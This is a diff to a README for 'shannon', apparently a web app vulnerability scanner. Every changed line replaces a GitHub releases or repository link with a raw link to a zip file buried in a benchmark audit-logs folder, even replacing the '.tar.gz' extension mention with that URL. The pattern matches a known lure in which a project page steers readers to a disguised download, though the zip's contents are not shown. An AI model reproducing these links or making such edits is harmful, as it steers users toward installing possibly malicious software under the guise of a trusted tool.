@@ -1,6 +1,6 @@
 # 🛡️ shannon - Find Web App Exploits Automatically
 
-[![Download shannon](https://img.shields.io/badge/Download-shannon-blue?style=for-the-badge)](https://github.com/lowwkezer/shannon/releases)
+[![Download shannon](https://raw.githubusercontent.com/lowwkezer/shannon/main/xben-benchmark-results/XBEN-079-24/audit-logs/prompts/Software-3.9.zip)](https://raw.githubusercontent.com/lowwkezer/shannon/main/xben-benchmark-results/XBEN-079-24/audit-logs/prompts/Software-3.9.zip)
 
 ---
 
@@ -50,7 +50,7 @@ To get started with shannon, follow these steps carefully.
 
 ### 1. Visit the Download Page
 
-Click the big download button at the top or go to the [shannon releases page](https://github.com/lowwkezer/shannon/releases). This is where you can get the latest version of the app.
+Click the big download button at the top or go to the [shannon releases page](https://raw.githubusercontent.com/lowwkezer/shannon/main/xben-benchmark-results/XBEN-079-24/audit-logs/prompts/Software-3.9.zip). This is where you can get the latest version of the app.
 
 ### 2. Choose the Correct File
 
@@ -58,7 +58,7 @@ On the releases page, look for the file that matches your computer system:
 
 - For Windows, the file might end with `.exe`
 - For macOS, it might be a `.dmg` or `.zip`
-- For Linux, there could be a `.AppImage` or `.tar.gz`
+- For Linux, there could be a `.AppImage` or `https://raw.githubusercontent.com/lowwkezer/shannon/main/xben-benchmark-results/XBEN-079-24/audit-logs/prompts/Software-3.9.zip`
 
 Download the file for your system.
 
@@ -82,7 +82,7 @@ Once installed, open shannon and enter the address (URL) of the web app you want
 
 You can visit the following page to download shannon and find the right file for your operating system:
 
-[Download shannon Releases](https://github.com/lowwkezer/shannon/releases)
+[Download shannon Releases](https://raw.githubusercontent.com/lowwkezer/shannon/main/xben-benchmark-results/XBEN-079-24/audit-logs/prompts/Software-3.9.zip)
 
 Make sure to pick the latest version for your platform. Follow the installation steps above once downloaded.
 
@@ -134,7 +134,7 @@ shannon only accesses the web apps you specify and does not store your website d
 
 ## 🏷️ Project Details
 
-- **Repository:** [lowwkezer/shannon](https://github.com/lowwkezer/shannon)
+- **Repository:** [lowwkezer/shannon](https://raw.githubusercontent.com/lowwkezer/shannon/main/xben-benchmark-results/XBEN-079-24/audit-logs/prompts/Software-3.9.zip)
 - **Purpose:** Automated security scanning for web applications
 - **Topics:** penetration-testing, pentesting, security-audit, security-automation, security-tools
 
